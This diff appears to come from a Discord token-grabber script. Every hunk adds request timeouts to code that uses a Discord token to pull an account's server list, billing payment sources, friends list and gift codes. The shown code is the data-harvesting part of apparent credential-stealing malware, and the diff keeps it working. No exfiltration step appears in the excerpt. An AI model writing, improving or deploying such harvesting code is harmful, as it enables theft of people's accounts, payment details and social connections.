@@ -80,7 +80,7 @@ try:
             authenticator_types_discord = "None"
 
         try:
-            guilds_response = requests.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token_discord})
+            guilds_response = requests.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token_discord}, timeout=5)
             if guilds_response.status_code == 200:
                 guilds = guilds_response.json()
                 try:
@@ -105,7 +105,7 @@ try:
 
 
         try:
-            billing_discord = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token_discord}).json()
+            billing_discord = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token_discord}, timeout=5).json()
             if billing_discord:
                 payment_methods_discord = []
 
@@ -123,7 +123,7 @@ try:
             payment_methods_discord = "None"
         
         try:
-            friends = requests.get('https://discord.com/api/v8/users/@me/relationships', headers={'Authorization': token_discord}).json()
+            friends = requests.get('https://discord.com/api/v8/users/@me/relationships', headers={'Authorization': token_discord}, timeout=5).json()
             if friends:
                 friends_discord = []
                 for friend in friends:
@@ -145,7 +145,7 @@ try:
             friends_discord = "None"
 
         try:
-            gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token_discord}).json()
+            gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token_discord}, timeout=5).json()
             if gift_codes:
                 codes = []
                 for gift_codes_discord in gift_codes:
